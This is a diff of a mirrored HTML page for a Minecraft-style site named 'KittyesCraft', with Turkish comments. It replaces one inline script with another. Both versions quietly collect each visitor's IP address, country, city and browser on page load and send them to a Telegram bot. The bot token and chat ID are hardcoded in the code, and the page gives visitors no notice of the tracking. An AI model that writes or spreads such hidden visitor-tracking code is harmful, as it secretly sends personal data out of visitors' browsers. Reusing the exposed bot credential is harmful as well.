@@ -673,77 +673,46 @@ fetch('http://ip-api.com/json/?fields=66846719')
     </script>  <!-- SNOW SCRIPT KAPATILDI -->
 
     <!-- TELEGRAM BOT -->
-    <!-- TELEGRAM BOT - TARAYICI DÜZELTİLMİŞ VERSİYON -->
-<!-- TELEGRAM BOT - TARAYICI KESİN ÇÖZÜM -->
-<!-- TELEGRAM BOT - TARAYICI KESİN ÇÖZÜM -->
-<script>
-const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
-const chatId = "1504410647";
+    <script>
+        const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
+        const chatId = "1504410647";
 
-// TARAYICI TESPİTİ - SON ÇÖZÜM
-function getBrowser() {
-    const ua = navigator.userAgent;
-    
-    // 1. KESIN YÖNTEM: Edge (birden çok kontrol)
-    if (ua.includes("Edg/") || ua.includes("Edge/") || ua.includes("EdgA") || ua.includes("EdgiOS")) {
-        return "Microsoft Edge";
-    }
-    
-    // 2. Opera
-    if (ua.includes("OPR") || ua.includes("Opera")) {
-        return "Opera";
-    }
-    
-    // 3. Firefox
-    if (ua.includes("Firefox")) {
-        return "Mozilla Firefox";
-    }
-    
-    // 4. Safari (Chrome'dan önce kontrol et)
-    if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("Edg")) {
-        return "Safari";
-    }
-    
-    // 5. Chrome (en son kontrol)
-    if (ua.includes("Chrome") && !ua.includes("Edg")) {
-        return "Google Chrome";
-    }
-    
-    return "Bilinmiyor - " + ua.substring(0, 50);
-}
-
-// DEBUG: Konsola yazdır
-console.log('========== TARAYICI BİLGİSİ ==========');
-console.log('User Agent:', navigator.userAgent);
-console.log('Tespit edilen tarayıcı:', getBrowser());
-console.log('======================================');
-
-// IP ve mesaj gönderme
-fetch('http://ip-api.com/json/?fields=66846719')
-  .then(response => response.json())
-  .then(data => {
-    const browser = getBrowser();
-    
-    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                    `🌐 <b>IP:</b> ${data.query}\n` +
-                    `📍 <b>Konum:</b> ${data.country} / ${data.city}\n` +
-                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                    `🚀 <b>Tarayıcı:</b> ${browser}`;
-    
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-            chat_id: chatId, 
-            text: message,
-            parse_mode: 'HTML'
-        })
-    });
-  })
-  .catch(error => {
-    console.log('IP alınamadı:', error);
-  });
-</script>
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP Verisi:', data);
+                
+                const userAgent = navigator.userAgent;
+                let browser = "Bilinmiyor";
+                if (userAgent.includes("Chrome")) browser = "Google Chrome";
+                else if (userAgent.includes("Firefox")) browser = "Firefox";
+                else if (userAgent.includes("Safari")) browser = "Safari";
+                else if (userAgent.includes("Edge")) browser = "Edge";
+                
+                const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                                `🌐 <b>IP:</b> ${data.ip}\n` +
+                                `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
+                                `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                                `🚀 <b>Tarayıcı:</b> ${browser}`;
+                
+                return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: chatId, 
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Telegram Sonucu:', result);
+            })
+            .catch(error => {
+                console.error('Hata:', error);
+            });
+    </script>
 </body>
 </body>
 
@@ -751,9 +720,6 @@ fetch('http://ip-api.com/json/?fields=66846719')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
-
-
-
 
 
 
